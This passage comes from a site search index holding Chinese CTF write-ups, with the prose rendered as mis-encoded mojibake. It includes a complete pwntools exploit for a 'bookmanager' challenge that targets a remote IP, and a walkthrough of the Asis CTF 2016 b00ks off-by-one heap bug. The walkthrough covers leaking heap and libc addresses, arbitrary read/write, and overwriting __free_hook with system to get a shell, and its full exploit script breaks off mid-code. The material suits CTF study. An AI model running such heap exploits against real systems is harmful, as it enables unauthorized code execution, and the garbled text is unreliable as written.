ä½†æ˜¯ï¼Œä½¿ç”¨é«˜ç‰ˆæœ¬çš„ gccã€g++ äº¤å‰ç¼–è¯‘ä½ç‰ˆæœ¬çš„ glibc ä¼šå‡ºç°å¾ˆå¤š bugï¼š\n æºç å±‚é¢çš„å‡ºç°å¾ˆå¤š bug åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼› cc1 ä¼šå°† warning å½“ä½œ errorï¼Œéœ€è¦åœ¨è¿è¡Œ configure å‘½ä»¤æ—¶åŠ å…¥ --disable-werrorã€‚  book manager #  ç¨‹åºæµç¨‹ï¼Œæ¼æ´å‘ç°ä»€ä¹ˆçš„éƒ½ä¸è¯´äº†ï¼Œè¿™ä¸ªé¢˜å¾ˆç®€å•ï¼Œç›´æ¥ä¸Š exp.pyï¼š\n#!/usr/bin/env python3 from pwn import *   class Challenge:  def __init__(self, local):  self.local = local  if local:  self.p = process([\u0026#34;./bookmanager\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;})  else:  self.p = remote(\u0026#34;47.112.115.30\u0026#34;, 13337)  self.libc = ELF(\u0026#34;/usr/local/glibc-2.23/lib/libc-2.23.so\u0026#34;)  self.section_ptr, self.book, self.libc_base = {}, {}, 0   def gdb(self, script):  assert self.local  context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]  gdb.attach(proc.pidof(self.p)[0], gdbscript=script)   def set_bookname(self, book_name):  self.p.sendlineafter(\u0026#34;Name of the book you want to create: \u0026#34;, book_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def add_chapter(self, chapter_name):  self.p.sendline(\u0026#34;1\u0026#34;)  self.p.sendlineafter(\u0026#34;Chapter name:\u0026#34;, chapter_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def add_section(self, chapter_name, section_name):  self.p.sendline(\u0026#34;2\u0026#34;)  self.p.sendlineafter(\u0026#34;Which chapter do you want to add into:\u0026#34;, chapter_name)  self.section_ptr[section_name] = int(self.p.recvline().lstrip(\u0026#34;0x\u0026#34;), 16)  self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def add_text(self, section_name, text_length, text):  assert text_length \u0026lt;= 256  self.p.sendline(\u0026#34;3\u0026#34;)  self.p.sendlineafter(\u0026#34;Which section do you want to add into:\u0026#34;, section_name)  self.p.sendlineafter(\u0026#34;How many chapters you want to write:\u0026#34;, str(text_length))  self.p.sendlineafter(\u0026#34;Text:\u0026#34;, text)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def remove_chapter(self, chapter_name):  self.p.sendline(\u0026#34;4\u0026#34;)  self.p.sendlineafter(\u0026#34;Chapter name:\u0026#34;, chapter_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def remove_section(self, section_name):  self.p.sendline(\u0026#34;5\u0026#34;)  self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def remove_text(self, section_name):  self.p.sendline(\u0026#34;6\u0026#34;)  self.p.sendlineafter(\u0026#34;Section name:\u0026#34;, section_name)  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def book_preview(self):  self.p.sendline(\u0026#34;7\u0026#34;)  recved = self.p.recvuntil(\u0026#34;\\n==========================\u0026#34;). \\  rstrip(\u0026#34;\\n==========================\u0026#34;).lstrip(\u0026#34;\\nBook:\u0026#34;)  book_name, chapters = recved.split(\u0026#34;\\nChapter:\u0026#34;)[0], recved.split(\u0026#34;\\nChapter:\u0026#34;)[1:]  self.book = {book_name: {}}  for cind, chapter in enumerate(chapters):  chapter_name, sections = chapter.split(\u0026#34;\\nSection:\u0026#34;)[0], chapter.split(\u0026#34;\\nSection:\u0026#34;)[1:]  self.book[book_name][chapter_name] = {}  for sind, section in enumerate(sections):  section_name, text = section.split(\u0026#34;\\nText:\u0026#34;)[0], section.split(\u0026#34;\\nText:\u0026#34;)[1]  self.book[book_name][chapter_name][section_name] = text  self.p.recvuntil(\u0026#34;Your choice:\u0026#34;)   def update(self, choice, old, new):  assert choice in [\u0026#34;Chapter\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;Text\u0026#34;]  self.p.sendline(\u0026#34;8\u0026#34;)  self.p.sendlineafter(\u0026#34;What to update?(Chapter/Section/Text):\u0026#34;, choice)  self.p.sendlineafter(\u0026#34;:\u0026#34;, old)  self.p.sendlineafter(\u0026#34;:\u0026#34;, new)  assert self.p.recvuntil(\u0026#34;Your choice:\u0026#34;).strip().startswith(\u0026#34;Updated\u0026#34;)   def pwn(self):  # todo: initialization  self.set_bookname(\u0026#34;PWN_BOOK\u0026#34;)  self.add_chapter(\u0026#34;chapter_one\u0026#34;)  self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_one\u0026#34;)  self.add_text(\u0026#34;section_one\u0026#34;, 0x100 - 0x10 - 0x30, \u0026#34;text_one\u0026#34;)  self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_two\u0026#34;)   # todo: leak heap to get arbitrarily write\u0026amp;read  self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, flat([  \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x28, \u0026#34;\\x00\u0026#34;), 0x20  ], word_size=64))   def write_to(address, content):  payload = flat([  \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x20, \u0026#34;\\x00\u0026#34;), address  ], word_size=64)  assert len(payload) \u0026lt; 0xff and len(content) \u0026lt; 0xff  self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, payload)  self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_two\u0026#34;, content)   def read_from(address):  payload = flat([  \u0026#34;A\u0026#34; * 0xc8, 0x41, \u0026#34;section_two\u0026#34;.ljust(0x20, \u0026#34;\\x00\u0026#34;), address  ], word_size=64)  assert len(payload) \u0026lt; 0xff  self.update(\u0026#34;Text\u0026#34;, \u0026#34;section_one\u0026#34;, payload)  self.book_preview()  text = self.book[\u0026#34;PWN_BOOK\u0026#34;][\u0026#34;chapter_one\u0026#34;][\u0026#34;section_two\u0026#34;]  return u64(text.ljust(8, \u0026#34;\\x00\u0026#34;)[:8])   # todo: leak libc address from unsorted bin  self.add_section(\u0026#34;chapter_one\u0026#34;, \u0026#34;section_three\u0026#34;)  self.add_text(\u0026#34;section_three\u0026#34;, 0x100, \u0026#34;BIGTEXT\u0026#34;)  self.add_chapter(\u0026#34;chapter_two\u0026#34;) # prevent heap-top  self.remove_text(\u0026#34;section_three\u0026#34;)  unsorted_bin_addr = read_from(self.section_ptr[\u0026#34;section_three\u0026#34;] + 0x30 + 0x10)  self.libc_base = unsorted_bin_addr - 0x19eb78  print \u0026#34;leak libc_base: %x\u0026#34; % self.libc_base   # todo: overwrite __free_hook \u0026amp; execute system(\u0026#34;/bin/sh\u0026#34;)  free_hook_addr = self.libc.symbols[\u0026#34;__free_hook\u0026#34;] + self.libc_base  system_addr = self.libc.symbols[\u0026#34;system\u0026#34;] + self.libc_base  write_to(free_hook_addr, p64(system_addr))  self.add_chapter(\u0026#34;/bin/sh\u0026#34;)  self.remove_chapter(\u0026#34;/bin/sh\u0026#34;)  self.p.interactive()   if __name__ == \u0026#34;__main__\u0026#34;:  c = Challenge(True)  c.pwn() "},{"id":159,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/offbyone/","title":"Offbyone","section":"ctf-wiki","content":" é¢˜ç›®ï¼šAsis CTF 2016 b00ks\n Off By One #  æ–‡ä»¶ä¿¡æ¯ #  é¦–å…ˆæ£€æŸ¥ä¿æŠ¤ç­‰çº§ï¼š\n$ checksec ./b00ks [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/offbyone/b00ks\u0026#39;  Arch: amd64-64-little  RELRO: Full RELRO  Stack: No canary found  NX: NX enabled  PIE: PIE enabled ç¨‹åºæ²¡æœ‰å¼€å¯æ ˆä¿æŠ¤ã€‚æŸ¥çœ‹å„ä¸ªæ®µçš„æƒé™ï¼š\ngdb-peda$ vmmap Warning: not running Start End Perm Name 0x00000808 0x0000135d rx-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00000238 0x00001914 r--p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks 0x00201d58 0x00202100 rw-p /mnt/d/program/ctf/ctf-wiki/offbyone/b00ks å„ä¸ªæ®µçš„åœ°å€åˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼æŸ¥çœ‹ï¼š\n$ readelf --section-headers ./b00ks There are 27 section headers, starting at offset 0x2160: ...... ç¨‹åºé€»è¾‘ #  main #  é¦–å…ˆçœ‹ main å‡½æ•°ï¼Œå°†å…¶ä¸­çš„è°ƒç”¨çš„å‡½æ•°é‡å‘½åä¹‹åå‡½æ•°çš„åå­—å¾ˆæ˜æ˜¾äº†ï¼š\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) {  __int64 savedregs; // [rsp+20h] [rbp+0h]   setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  print_welcome();  read_author_name();  while ( (unsigned int)menu() != 6 )  {  switch ( (unsigned int)\u0026amp;savedregs )  {  case 1u: create(); break;  case 2u: delete(); break;  case 3u: edit(); break;  case 4u: detail(); break;  case 5u: read_author_name(); break;  default:  puts(\u0026#34;Wrong option\u0026#34;);  break;  }  }  puts(\u0026#34;Thanks to use our library software\u0026#34;);  return 0LL; } create #  é€šè¿‡é˜…è¯»å‡½æ•°çš„ä¼ªä»£ç ï¼Œè¯¥å‡½æ•°å¤§è‡´å®ç°çš„æ˜¯ä¸‹é¢çš„ç¨‹åºæµç¨‹å›¾ï¼š\n+---------+ +-------------+ +---------+ +----------------+\r|read size-------\u0026gt;|read bookname--------\u0026gt;|read size-------\u0026gt;|read description|\r+---------+ +-------------+ +---------+ +----------------+ æœ€åæ•°æ®å­˜å…¥ GLOBAL_LIBRARY å…¨å±€å˜é‡ä¸­ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š\n .bss heap\rGLOBAL_LIBRARY +-------+ 0 |8 bytes| +---------------+ --------- |bookname string|\u0026lt;------------+\r1 |8 bytes| +---------------+ |\r--------- +------------------+ |\r2 |8 bytes| |description string|\u0026lt;----+ |\r--------- +------------------+ | |\r...| | | |\r--------- +----------+ | |\r18 |8 bytes|--------\u0026gt;0 |seq number| | |\r--------- ------------ | |\r19 |8 bytes| 1 |bookname_p|-------------|----+\r+-------+ ------------ | 2 |descript_p|-------------+ ------------\r3 |descript_l|(prev-4-bytes)\r------------ delete #  åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå…ˆè¯»å–ä¸€ä¸ª idï¼Œç„¶åç”¨äº†ä¸€ä¸ª for å¾ªç¯æ‰¾åˆ°éœ€è¦é‡Šæ”¾çš„ä½ç½®ï¼Œæ‰¾åˆ° ID æ‰€åœ¨çš„ä½ç½®ä¹‹åï¼Œæ‰§è¡Œåé¢çš„é‡Šæ”¾å†…å­˜çš„å‡½æ•°ã€‚å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ã€‚\nedit #  è¯¥å‡½æ•°é€šè¿‡åŒæ ·çš„æ–¹å¼æ‰¾åˆ°äº† for å¾ªç¯éœ€è¦é‡Šæ”¾çš„ä½ç½®ä¹‹åï¼Œè°ƒç”¨äº† read_str å‡½æ•°ï¼Œä»¥ä¹‹å‰ create å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ç»“æ„ä½œä¸ºä¼ å‚ï¼Œé€šè¿‡åŒæ ·çš„æ–¹å¼è®¾ç½®äº† description çš„å†…å­˜ã€‚å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ã€‚\ndetail #  éå† GLOBAL_LIBRARY ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚\nå°† id æŒ‡å‘çš„æ•°å­—æ‰“å°å‡ºæ¥ï¼Œå°† booknameã€bookdescription ä¸ authorname æŒ‡å‘çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚\nread_str #  åœ¨ read_auther_name()ã€create()ã€edit è¿™äº›å‡½æ•°ä¸­ï¼Œéƒ½è°ƒç”¨äº†ä¸€ä¸ªè‡ªå·±å®ç°çš„è¯»å–å­—ç¬¦ä¸²çš„å‡½æ•° read_str()ã€‚å®ƒä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦å‹æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªå‚æ•°éƒ½æ˜¯ æŒ‡é’ˆåˆ†é…çš„å†…å­˜å¤§å° - 1ã€‚\nå®ƒçš„ä¼ªä»£ç å¦‚ä¸‹ï¼š\nsigned __int64 __fastcall read_str(_BYTE *ptr, int len_1) {  int i; // [rsp+14h] [rbp-Ch]  _BYTE *buf; // [rsp+18h] [rbp-8h]   if ( len_1 \u0026lt;= 0 )  return 0LL;  buf = ptr;  for ( i = 0; ; ++i )  {  if ( (unsigned int)read(0, buf, 1uLL) != 1 )  return 1LL;  if ( *buf == \u0026#39;\\n\u0026#39; )  break;  ++buf;  if ( i == len_1 )  break;  }  *buf = 0;  return 0LL; } æ¼æ´å‘ç° #  æˆ‘ä»¬ä»”ç»†ç ”ç©¶ read_str() è¿™ä¸ªå‡½æ•°ä¹‹åä¼šå‘ç°ï¼Œå¦‚æœåœ¨è¾¾åˆ°è¾“å…¥çš„é•¿åº¦æ—¶ï¼Œfor å¾ªç¯ç»“æŸæ—¶åº”è¯¥æ˜¯ä»¥ä¸‹çŠ¶æ€ï¼š\n +--------+ 0 | | ---------- ... | | ---------- len-1| top |\u0026lt;----i ---------- len |overflow|\u0026lt;----buff\r+--------+ å¯è§æœ€åä¸€ä¸ª 0 å­—èŠ‚æ˜¯å†™å‘äº†ç¼“å†²åŒºå¤–éƒ¨ï¼Œæ˜¯æº¢å‡ºäº†ã€‚è¿™ä¸ªå‡½æ•°æ˜¯å­˜åœ¨ off-by-one æ¼æ´çš„ã€‚\nleak_heap #  é¦–å…ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ author_name åœ¨ .bss åŒºçš„æº¢å‡ºæ¼æ´ï¼Œæ‰“å° GLOBAL_LIBRARY ç¬¬ä¸€é¡¹çš„å†…å®¹ï¼Œè€Œè¿™ä¸€é¡¹æ˜¯ä¸€ä¸ªæŒ‡å‘ heap æ®µçš„åœ°å€ï¼Œé€šè¿‡è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å¯ä»¥æ³„éœ²å †åœ°å€ï¼š\n # todo: leak heap addr  self.set_author_name(\u0026#34;A\u0026#34; * 32)  self.create(0x18, \u0026#34;B\u0026#34; * 0x18, 0x100, \u0026#34;C\u0026#34; * 0x100) # 1  self.detail()  author = [ld[\u0026#34;Author\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;1\u0026#34;]  assert len(author) == 1  library0 = u64(author[0][32:] + \u0026#34;\\x00\\x00\u0026#34;)  print \u0026#34;leak library0 address: %s\u0026#34; % hex(library0) æ³„éœ²ä¹‹åå‘ç°è¿™ä¸ªæ³„éœ²çš„å †åœ°å€æ˜¯ 0x55C106CBC2B0ï¼Œç„¶åæˆ‘ä»¬åŠ¨æ€è°ƒå¼æŸ¥çœ‹å †åœ°å€çš„å†…å®¹å¯ä»¥å‘ç°ï¼š\n000055C106CBC260 00 00 00 00 00 00 00 00 21 00 00 00 00 00 00 00 ........!.......\r000055C106CBC270 4C 65 61 6B 48 65 61 70 00 00 00 00 00 00 00 00 LeakHeap........\r000055C106CBC280 00 00 00 00 00 00 00 00 21 00 00 00 00 00 00 00 ........!.......\r000055C106CBC290 4C 65 61 6B 44 65 73 63 00 00 00 00 00 00 00 00 LeakDesc........\r000055C106CBC2A0 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00 ........1.......\r000055C106CBC2B0 01 00 00 00 00 00 00 00 70 C2 CB 06 C1 55 00 00 ........p.......\r000055C106CBC2C0 90 C2 CB 06 C1 55 00 00 18 00 00 00 00 00 00 00 ................\r000055C106CBC2D0 00 00 00 00 00 00 00 00 31 FD 01 00 00 00 00 00 ........1....... å®¹æ˜“çœ‹å‡ºï¼Œä¸Šé¢æˆªå–çš„åœ°å€æ˜¯ä¸‰ä¸ªè¿ç»­çš„å †å—ã€‚book nameã€book description ä¸ book ä¸‰ä¸ªå†…å­˜å—ã€‚\nget_addr_write #  ä¸‹é¢æˆ‘ä»¬å°è¯•è·å–ä»»æ„åœ°å€å†™ã€‚åŒæ ·æ ¹æ®ä¸Šé¢çš„æ€è·¯ï¼š\n æˆ‘ä»¬é€šè¿‡ .bss æ®µçš„æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¦†ç›– LIBRARY[0] çš„æœ€ä½å­—èŠ‚ï¼Œä»è€Œæ›´æ”¹å®ƒæŒ‡å‘çš„åœ°å€ã€‚ ä¸ºäº†æ§åˆ¶æ–°çš„ LIBRARY[0]ï¼Œå¯ä»¥é€šè¿‡å°† description çš„å¤§å°æ§åˆ¶å¤§äº 0x100ï¼Œè¿™æ · LIBRARY[0] çš„åœ°å€å°±ä¸€å®šä¼šè½åœ¨å®ƒçš„ Description ä¸Šï¼› æˆ‘ä»¬å°†æ–°çš„ LIBRARY[0] çš„ Decription æŒ‡å‘ LIBRARY[1]ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ LIBRARY[0] æŒ‡å®šç›®æ ‡åœ°å€ï¼Œé€šè¿‡ LIBRARY[1] ä¿®æ”¹åœ°å€çš„å†…å®¹ï¼›  ç”»å›¾è¯´æ˜é€»è¾‘æ›´åŠ ç›´è§‚ã€‚æ¯”å¦‚ï¼ŒåŸæœ¬æœ‰ä¸€ä¸ªæ­£å¸¸çš„ä¸¤ä¸ªåˆ†é…çš„ä¹¦å—ï¼š\n Heap Segment +--------------------+ 0x18 | book1 name buffer | ---------------------- 0x100 | book1 desc buffer | +-----------+ ---------------------- | library[0]|-----------\u0026gt;| book1 seqnumber | ------------- 0x20 | book1 name ptr | | library[1]|-+ | book1 desc ptr | ------------- | | book1 desc size | | ...... | | +--------------------+ +-----------+ | +--------------------+ | 0x20 | book2 name buffer | | ---------------------- | 0x20 | book2 desc buffer | | ---------------------- +---------\u0026gt;| book2 seqnumber | 0x20 | book2 name ptr | | book2 desc ptr | | book2 desc size | +--------------------+ ç»è¿‡æˆ‘ä»¬æ§åˆ¶ LIBRARY[0] çš„åœ°å€çš„ä¹‹åå¯ä»¥å½¢æˆå¦‚ä¸‹çš„å½¢å¼ï¼š\n Heap Segment +--------------------+ 0x18 | book1 name buffer | ---------------------- 0x100 | book1 desc buffer | +-----------+ | | | library[0]|------------\u0026gt;| control seqnumber | 1 ------------- | control name ptr | | library[1]|--+ | control desc ptr |---------+\r------------- | | control desc size | 0x100 |\r| ...... | | ---------------------- |\r+-----------+ | | book1 seqnumber | 1 |\r| 0x20 | book1 name ptr | |\r| | book1 desc ptr | |\r| | book1 desc size | 0x100 |\r| +--------------------+ |\r| +--------------------+ |\r| 0x20 | book2 name buffer | |\r| ---------------------- |\r| 0x20 | book2 desc buffer | |\r| ---------------------- |\r+--------\u0026gt; | book2 seqnumber | 2 |\r0x20 | book2 name ptr | |\r| book2 desc ptr |\u0026lt;--------+\r| book2 desc size | 0x20 +--------------------+ äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ LIBRARY[0] æ§åˆ¶ LIBRARY[1] çš„æŒ‡é’ˆï¼Œä»è€Œä¿®æ”¹/è¯»å–ä»»æ„åœ°å€ã€‚\næ³„éœ²çš„è„šæœ¬å¦‚ä¸‹ï¼š\n # todo: get arbitrary address write\u0026amp;read  self.create(0x20, \u0026#34;D\u0026#34; * 0x20, 0x20, \u0026#34;E\u0026#34; * 0x20) # 2  offset = library0 \u0026amp; 0xff  assert offset \u0026gt;= 0x20  payload = \u0026#34;C\u0026#34;*(0x100+0x10 - offset) + p64(0x1) \\  + p64(library0 + 0x20 + 0x10) \\  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \\  + p64(0x100)  self.edit(1, payload)  self.set_author_name(\u0026#34;A\u0026#34; * 32)  print \u0026#34;get arbitrary address write\u0026amp;read\u0026#34; å¯ä»¥é€šè¿‡ä¸‹é¢ä¸¤ä¸ªå‡½æ•°è¿›è¡Œä»»æ„è¯»å†™ï¼š\n def write_to(self, addr, content):  self.edit(1, p64(addr) + p64(len(content) + 1))  self.edit(2, content)   def read_from(self, addr):  self.edit(1, p64(addr))  self.detail()  desc = [ld[\u0026#34;Description\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;2\u0026#34;]  assert len(desc) == 1  return u64((desc[0] + \u0026#34;\\x00\\x00\u0026#34;)[:8]) leak_libc #  é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜éœ€è¦æ³„éœ² libcåœ°å€/æ ˆåœ°å€ï¼Œä¹‹åé€šè¿‡å†™ got è¡¨åŠ«æŒæµç¨‹æˆ–è€…å†™ __malloc_hook åŠ«æŒæµç¨‹ç­‰ã€‚\nå› ä¸º off-by-one æ¼æ´çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ unlink æ–¹æ³•ï¼Œå› ä¸ºæ­¤æ—¶å †åŒºå°±è¢«æ”¾å…¥äº†unsorted bins çš„åŒå‘é“¾è¡¨ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥å°† main_arena.bins çš„åœ°å€å†™å…¥å †åŒºä¸­ã€‚\nä½†æ˜¯æˆ‘ä»¬æœ¬åœ°è°ƒè¯•ç¯å¢ƒæ˜¯ libc 2.28ï¼Œåœ¨ 2.26 ä¹‹å glibc å¼•å…¥äº† tcache æœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé‡Šæ”¾ 7 ä¸ª chunk å¡«å…… tcache åƒåœ¾ç®±ï¼Œä»ç¬¬å…«ä¸ªå¼€å§‹æ‰ä¼šè¿›å…¥ unsorted binsã€‚ä»£ç å¦‚ä¸‹ï¼š\n # todo: leak libc address via unsorted bin address  for i in range(4):  self.create(0x100, \u0026#34;F\u0026#34; * 0x100, 0x100, \u0026#34;G\u0026#34; * 0x100) # 3,4,5,6  for i in range(4):  self.delete(i + 3) # 3,4,5,6  libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0  print \u0026#34;leak libc base address: %s\u0026#34; % hex(libcbase) write __free_hook #  åœ¨ libc çš„ free å‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œä¼šæ£€æŸ¥ä¸€ä¸ªåœ°å€ä¸­æ˜¯å¦å­˜åœ¨å‡½æ•°ã€‚å¦‚æœå­˜åœ¨åˆ™ä¼ å…¥ç›®æ ‡åœ°å€å¹¶ä¸”æ‰§è¡Œå®ƒï¼Œè¿™ä¸ªåœ°å€å«åš __free_hookï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªåœ°å€æŒ‡å‘ system å‡½æ•°ï¼Œè§¦å‘é‡Šæ”¾å°±å¯ä»¥å¾—åˆ° shellã€‚\nä¸ºäº†æ‰§è¡Œ system(\u0026quot;/bin/sh\u0026quot;)ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œä»¥ä¸‹çš„ä¸¤æ­¥æ“ä½œï¼š\n å°† /bin/sh å­—ç¬¦ä¸²å†™å…¥éœ€è¦é‡Šæ”¾çš„å†…å­˜åŒºåŸŸä¸­ï¼› å°† __free_hook å¯¹åº”çš„åœ°å€æŒ‡å‘ system å‡½æ•°ã€‚   # todo:  # 1. write \u0026#34;/bin/sh\u0026#34; to library[2] name  # 2. replace `__free_hook` as `system`  bin_sh_addr = libcbase + next(self.libc.search(\u0026#34;/bin/sh\u0026#34;))  free_hook_addr = libcbase + self.libc.symbols[\u0026#34;__free_hook\u0026#34;]  system_addr = libcbase + self.libc.symbols[\u0026#34;system\u0026#34;]  print \u0026#34;\u0026#39;/bin/sh\u0026#39; address: %x\u0026#34; % bin_sh_addr  print \u0026#34;_free_hook address: %x\u0026#34; % free_hook_addr  print \u0026#34;system address: %x\u0026#34; % system_addr  self.create(0x20, \u0026#34;/bin/sh\u0026#34;, 0x20, \u0026#34;/bin/sh\u0026#34;) # 7  self.write_to(free_hook_addr, p64(system_addr)) get_shell #  æœ€åå°±å¯ä»¥è§¦å‘é‡Šæ”¾å‡½æ•°æ‹¿åˆ°ä¸»æœº shellï¼š\n # todo: get shell  self.p.sendline(\u0026#34;2\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, \u0026#34;7\u0026#34;)  self.p.interactive() è„šæœ¬ #  å®Œæ•´çš„ exp.py å¦‚ä¸‹ï¼š\n#!/usr/bin/env python2 # coding=utf-8 from pwn import *   class Challenge:  def __init__(self, local=True):  self.local = local  self.p = process([\u0026#34;./b00ks\u0026#34;])  self.libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.28.so\u0026#34;)  self.library_detail = []   def gdb(self, script):  assert self.local  context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]  gdb.attach(proc.pidof(self.p)[0], gdbscript=script)   def create(self, book_name_size, book_name, desc_size, description):  self.p.sendline(\u0026#34;1\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter book name size: \u0026#34;, str(book_name_size))  self.p.sendlineafter(\u0026#34;Enter book name (Max 32 chars): \u0026#34;, book_name)  self.p.sendlineafter(\u0026#34;Enter book description size: \u0026#34;, str(desc_size))  self.p.sendlineafter(\u0026#34;Enter book description: \u0026#34;, description)  self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;)   def delete(self, book_id):  self.p.sendline(\u0026#34;2\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, str(book_id))  self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;)   def edit(self, book_id, new_desc):  self.p.sendline(\u0026#34;3\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter the book id you want to edit: \u0026#34;, str(book_id))  self.p.sendlineafter(\u0026#34;Enter new book description: \u0026#34;, new_desc)  self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;)   def detail(self):  self.p.sendline(\u0026#34;4\u0026#34;)  detail = self.p.recvuntil(\u0026#34;\\n\\n\u0026#34;)  self.library_detail = [  {  (\u0026#34;ID\u0026#34; if len(item) == 1 else item[0]): (item[0] if len(item) == 1 else item[1])  for item in [i.split(\u0026#34;: \u0026#34;) for i in dp.strip(\u0026#34;\\n\u0026#34;).split(\u0026#34;\\n\u0026#34;)]  } for dp in detail.split(\u0026#34;\\nID: \u0026#34;)  ]  self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;)   def set_author_name(self, author_name, init=False):  if not init:  self.p.sendline(\u0026#34;5\u0026#34;)  self.p.sendlineafter(\u0026#34;Enter author name: \u0026#34;, author_name)  self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;)   def write_to(self, addr, content):  self.edit(1, p64(addr) + p64(len(content) + 1))  self.edit(2, content)   def read_from(self, addr):  self.edit(1, p64(addr))  self.detail()  desc = [ld[\u0026#34;Description\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;2\u0026#34;]  assert len(desc) == 1  return u64((desc[0] + \u0026#34;\\x00\\x00\u0026#34;)[:8])   def pwn(self):  self.set_author_name(\u0026#34;shesl-meow\u0026#34;, init=True)  # todo: leak heap addr  self.set_author_name(\u0026#34;A\u0026#34; * 32)  self.create(0x18, \u0026#34;B\u0026#34; * 0x18, 0x100, \u0026#34;C\u0026#34; * 0x100) # 1  self.detail()  author = [ld[\u0026#34;Author\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;1\u0026#34;]  assert len(author) == 1  library0 = u64(author[0][32:] + \u0026#34;\\x00\\x00\u0026#34;)  print \u0026#34;leak library0 address: %s\u0026#34; % hex(library0)   # todo: get arbitrary address write\u0026amp;read  self.create(0x20, \u0026#34;D\u0026#34; * 0x20, 0x20, \u0026#34;E\u0026#34; * 0x20) # 2  offset = library0 \u0026amp; 0xff  assert offset \u0026gt;= 0x20  payload = \u0026#34;C\u0026#34;*(0x100+0x10 - offset) + p64(0x1) \\  + p64(library0 + 0x20 + 0x10) \\  + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \\  + p64(0x100)  self.edit(1, payload)  self.set_author_name(\u0026#34;A\u0026#34; * 32)  print \u0026#34;get arbitrary address write\u0026amp;read\u0026#34;   # todo: leak libc address via unsorted bin address  for i in range(4):  self.create(0x100, \u0026#34;F\u0026#34; * 0x100, 0x100, \u0026#34;G\u0026#34; * 0x100) # 3,4,5,6  for i in range(4):  self.delete(i + 3) # 3,4,5,6  libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0  print \u0026#34;libc base address: %x\u0026#34; % libcbase   # todo:  # 1. write \u0026#34;/bin/sh\u0026#34; to library[2] name  # 2. replace `__free_hook` as `system`  bin_sh_addr = libcbase + next(self.libc.search(\u0026#34;/bin/sh\u0026#34;))  free_hook_addr = libcbase + self.libc.symbols[\u0026#34;__free_hook\u0026#34;]  